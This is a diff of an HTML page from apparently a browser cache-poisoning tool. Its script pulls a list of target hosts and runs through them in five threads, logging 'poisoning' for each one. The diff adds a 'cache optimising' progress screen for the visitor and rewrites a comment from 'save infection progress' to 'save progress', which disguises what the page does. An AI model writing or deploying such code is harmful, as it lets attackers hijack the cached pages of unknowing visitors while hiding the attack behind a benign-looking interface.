@@ -3,10 +3,14 @@
 <head>
 	<meta charset="utf-8" />
 	<title>HTTP Cache</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 	<style>
 	</style>
 </head>
 <body>
+	<div>缓存优化中。。。</div>
+	<div id="uiStat">ready</div>
+	<progress id="uiProg" max="100"></progress>
 	<script>
 		var URL_GET_LIST = '__get_poisoning_list__';
 
@@ -16,6 +20,8 @@
 		function writeLS(key, val) {
 			localStorage[key] = val;
 		}
+
+		writeLS('prog', 0);
 
 		var MAX_THREAD = 5;
 
@@ -30,7 +36,7 @@
 				}
 			}
 
-			// 保存感染进度
+			// 保存进度
 			var lastProg = prog;
 
 			setInterval(function() {
@@ -43,7 +49,7 @@
 
 		function task() {
 			if (prog >= list.length) {
-				/*uiStat.innerHTML = 'done';*/
+				uiStat.innerHTML = 'done';
 				return true;
 			}
 			var url = 'http://' + list[prog++];
@@ -51,8 +57,8 @@
 
 			// display
 			console.info('poisoning %s', url);
-			/*uiStat.innerHTML = prog + '/' + list.length;
-			uiProg.value = 100 * prog / list.length;*/
+			uiStat.innerHTML = prog + '/' + list.length;
+			uiProg.value = 100 * prog / list.length;
 		}
 
 		function preload(url, callback) {
